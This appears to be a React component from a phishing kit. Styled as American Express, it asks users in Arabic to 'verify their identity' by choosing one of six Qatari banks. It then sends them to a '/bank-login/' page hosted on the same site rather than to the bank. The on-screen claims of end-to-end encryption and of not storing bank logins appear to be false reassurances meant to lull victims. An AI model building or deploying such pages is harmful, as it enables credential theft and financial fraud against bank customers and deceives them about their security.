// components/BankSelection.jsx
'use client';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';

const banks = [
  { id: 'qnb', name: 'QNB', logo: '/images/qnb.png' },
  { id: 'qib', name: 'Qatar Islamic Bank', logo: '/images/masref.png' },
  { id: 'doha', name: 'Doha Bank', logo: '/images/doha.webp' },
  {
    id: 'commercial',
    name: 'Commercial Bank',
    logo: '/images/comm.png'
  },
  { id: 'masraf', name: 'Masraf Al Rayan', logo: '/images/rayan.png' },
  { id: 'ahli', name: 'Ahli Bank', logo: '/images/ahli.png' }
];

export default function BankSelection() {
  const router = useRouter();
  const [selectedBank, setSelectedBank] = useState(null);
  const [loading, setLoading] = useState(false);

  const handleBankSelect = (bankId) => {
    setSelectedBank(bankId);
  };

  const handleContinue = () => {
    if (!selectedBank) return;

    setLoading(true);

    // Store selected bank in session storage
    sessionStorage.setItem('selectedBank', selectedBank);

    // Redirect to bank login page
    setTimeout(() => {
      router.push(`/bank-login/${selectedBank}`);
    }, 1000);
  };

  return (
    <div className='bg-amex-dark-gray mx-auto max-w-3xl rounded-xl p-6 shadow-lg md:p-8'>
      <h2 className='text-amex-blue mb-2 text-2xl font-bold'>تحقق من الهوية</h2>
      <p className='mb-6 text-gray-300'>
        للتحقق من هويتك، يرجى اختيار البنك الذي تتعامل معه. سنقوم بتوجيهك إلى
        صفحة تسجيل الدخول الآمنة الخاصة ببنكك.
      </p>

      <div className='mb-8 grid grid-cols-2 gap-4 md:grid-cols-3'>
        {banks.map((bank) => (
          <div
            key={bank.id}
            onClick={() => handleBankSelect(bank.id)}
            className={`border ${
              selectedBank === bank.id
                ? 'border-amex-blue shadow-amex-glow'
                : 'border-gray-600'
            } hover:border-amex-blue flex cursor-pointer flex-col items-center rounded-lg p-4 transition-all`}
          >
            <div className='mb-2 flex h-24 w-32 items-center justify-center rounded-lg bg-white p-2'>
              <Image
                src={bank.logo}
                alt={bank.name}
                width={100}
                height={100}
                objectFit='contain'
                className='object-contain'
              />
            </div>
            <p className='text-center text-sm'>{bank.name}</p>
          </div>
        ))}
      </div>

      <div className='mb-8 text-gray-300'>
        <p className='mb-2 flex items-start'>
          <svg
            className='text-amex-blue mr-2 mt-1 h-5 w-5'
            fill='none'
            stroke='currentColor'
            viewBox='0 0 24 24'
          >
            <path
              strokeLinecap='round'
              strokeLinejoin='round'
              strokeWidth='2'
              d='M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z'
            ></path>
          </svg>
          هذا التحقق آمن ومشفر. لن نقوم بتخزين بيانات تسجيل الدخول الخاصة ببنكك.
        </p>
        <p className='flex items-start'>
          <svg
            className='text-amex-blue mr-2 mt-1 h-5 w-5'
            fill='none'
            stroke='currentColor'
            viewBox='0 0 24 24'
          >
            <path
              strokeLinecap='round'
              strokeLinejoin='round'
              strokeWidth='2'
              d='M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z'
            ></path>
          </svg>
          نستخدم تقنية التشفير من طرف إلى طرف لضمان أمان معلوماتك.
        </p>
      </div>

      <button
        onClick={handleContinue}
        disabled={!selectedBank || loading}
        className='btn-amex flex w-full items-center justify-center'
      >
        {loading ? (
          <>
            <svg
              className='text-amex-dark -ml-1 mr-3 h-5 w-5 animate-spin'
              xmlns='http://www.w3.org/2000/svg'
              fill='none'
              viewBox='0 0 24 24'
            >
              <circle
                className='opacity-25'
                cx='12'
                cy='12'
                r='10'
                stroke='currentColor'
                strokeWidth='4'
              ></circle>
              <path
                className='opacity-75'
                fill='currentColor'
                d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
              ></path>
            </svg>
            جاري التوجيه...
          </>
        ) : (
          'المتابعة إلى البنك'
        )}
      </button>
    </div>
  );
}
